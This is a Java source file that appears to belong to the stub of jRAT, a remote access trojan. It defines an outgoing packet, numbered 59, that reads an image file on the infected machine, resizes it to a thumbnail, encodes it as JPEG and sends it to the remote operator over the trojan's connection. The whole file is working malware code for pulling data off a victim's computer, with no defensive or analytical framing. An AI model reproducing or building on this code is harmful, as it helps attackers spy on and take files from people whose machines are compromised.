package se.jrat.stub.packets.outgoing;

import java.awt.image.BufferedImage;
import java.io.ByteArrayOutputStream;
import java.io.DataOutputStream;
import java.io.File;

import javax.imageio.ImageIO;

import se.jrat.common.io.StringWriter;
import se.jrat.common.utils.ImageUtils;
import se.jrat.stub.Connection;


public class Packet59ThumbnailPreview extends AbstractOutgoingPacket {

	private String file;

	public Packet59ThumbnailPreview(String file) {
		this.file = file;
	}

	@Override
	public void write(DataOutputStream dos, StringWriter sw) throws Exception {
		sw.writeLine(file);
		
		BufferedImage image = ImageIO.read(new File(file));
		image = ImageUtils.resize(image, 150, 100);
		
		ByteArrayOutputStream bss = new ByteArrayOutputStream();

		 
		ImageIO.write(image, "jpg", bss);
		byte[] buffer = bss.toByteArray();
		
		Connection.dos.writeInt(buffer.length);
		Connection.dos.write(buffer);
	}

	@Override
	public byte getPacketId() {
		return 59;
	}

}
